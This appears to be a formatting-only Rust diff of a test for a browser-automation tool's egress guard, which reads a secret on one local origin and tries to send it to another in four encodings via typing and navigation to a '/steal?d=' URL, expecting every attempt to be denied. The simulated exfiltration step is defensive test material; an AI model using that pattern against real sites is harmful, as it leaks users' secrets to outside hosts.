@@ -28,7 +28,11 @@ fn serve(page: String) -> (String, Log) {
             std::thread::spawn(move || {
                 let mut buf = [0u8; 8192];
                 let n = s.read(&mut buf).unwrap_or(0);
-                let first = String::from_utf8_lossy(&buf[..n]).lines().next().unwrap_or("").to_string();
+                let first = String::from_utf8_lossy(&buf[..n])
+                    .lines()
+                    .next()
+                    .unwrap_or("")
+                    .to_string();
                 if !first.contains("favicon") && !first.is_empty() {
                     lg.lock().unwrap().push(first);
                 }
@@ -159,7 +163,10 @@ fn run(mutate: bool) -> (usize, usize, usize) {
     }
     let _ = c.ok("navigate", json!({"url": format!("{a}/")}));
     let ext = c.ok("extract", json!({}));
-    assert!(ext.contains(SECRET), "fixture: secret not extracted:\n{ext}");
+    assert!(
+        ext.contains(SECRET),
+        "fixture: secret not extracted:\n{ext}"
+    );
     let b64 = base64::engine::general_purpose::STANDARD.encode(SECRET);
     let hex: String = SECRET.bytes().map(|x| format!("{x:02x}")).collect();
     let enc = [
@@ -179,11 +186,17 @@ fn run(mutate: bool) -> (usize, usize, usize) {
     for (name, v) in &enc {
         let (_, to_b) = fresh(&mut c);
         let (err, txt) = c.call("type", json!({"handle": to_b, "text": v}));
-        eprintln!("D2 type->B {name}: err={err} {}", txt.lines().next().unwrap_or(""));
+        eprintln!(
+            "D2 type->B {name}: err={err} {}",
+            txt.lines().next().unwrap_or("")
+        );
         blocked += usize::from(err && txt.contains("EGRESS-DENIED"));
         fresh(&mut c);
         let (err, txt) = c.call("navigate", json!({"url": format!("{b}/steal?d={v}")}));
-        eprintln!("D2 nav->B {name}: err={err} {}", txt.lines().next().unwrap_or(""));
+        eprintln!(
+            "D2 nav->B {name}: err={err} {}",
+            txt.lines().next().unwrap_or("")
+        );
         blocked += usize::from(err && txt.contains("EGRESS-DENIED"));
     }
     let (to_a, _) = fresh(&mut c);
@@ -193,7 +206,12 @@ fn run(mutate: bool) -> (usize, usize, usize) {
     let (_, to_b) = fresh(&mut c);
     let (err, _) = c.call("type", json!({"handle": to_b, "text": "hello there"}));
     let allowed_hello = usize::from(!err);
-    let leaked = b_log.lock().unwrap().iter().filter(|l| l.contains("/steal")).count();
+    let leaked = b_log
+        .lock()
+        .unwrap()
+        .iter()
+        .filter(|l| l.contains("/steal"))
+        .count();
     eprintln!("D2 blocked={blocked}/8 allowed_a={allowed_a} allowed_hello={allowed_hello} b_steal_requests={leaked}");
     (blocked, allowed_a + allowed_hello, leaked)
 }
@@ -201,13 +219,22 @@ fn run(mutate: bool) -> (usize, usize, usize) {
 #[test]
 fn secret_read_on_a_cannot_reach_b_in_four_encodings() {
     let (blocked, allowed, leaked) = run(false);
-    assert_eq!(blocked, 8, "type+navigate x 4 encodings must all be refused");
-    assert_eq!(allowed, 2, "same-origin and harmless sends must stay allowed");
+    assert_eq!(
+        blocked, 8,
+        "type+navigate x 4 encodings must all be refused"
+    );
+    assert_eq!(
+        allowed, 2,
+        "same-origin and harmless sends must stay allowed"
+    );
     assert_eq!(leaked, 0, "no /steal request may reach B");
 }
 
 #[test]
 fn mutant_without_the_check_goes_red() {
     let (blocked, _, leaked) = run(true);
-    assert!(blocked < 8 && leaked > 0, "mutant stayed green: blocked={blocked} leaked={leaked}");
+    assert!(
+        blocked < 8 && leaked > 0,
+        "mutant stayed green: blocked={blocked} leaked={leaked}"
+    );
 }
